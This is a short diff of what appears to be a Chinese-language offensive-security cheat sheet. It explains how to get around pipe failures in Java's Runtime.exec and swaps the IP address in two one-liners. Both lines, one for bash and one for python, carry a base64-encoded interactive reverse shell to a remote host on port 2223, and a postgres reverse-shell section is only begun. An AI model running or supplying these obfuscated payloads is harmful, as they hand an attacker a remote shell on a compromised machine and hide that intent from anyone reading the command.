@@ -109,9 +109,9 @@ public static void main(String[] args) throws Exception {
 Runtime执行linux命令时管道符不生效, 用base64编码内容
 ```sh
 #bash
-bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjIuNzYuMTkyLzIyMjMgMD4mMSA=}|{base64,-d}|{bash,-i}
+bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yLjMuNC8yMjIzIDA+JjEg}|{base64,-d}|{bash,-i}
 #python
-python -c exec('L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yMjIuNzYuMTkyLzIyMjMgMD4mMQ=='.decode('base64'))
+python -c exec('L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNC4yLjMuNC8yMjIzIDA+JjEg'.decode('base64'))
 ```
 
 __postgres__ 反弹shell
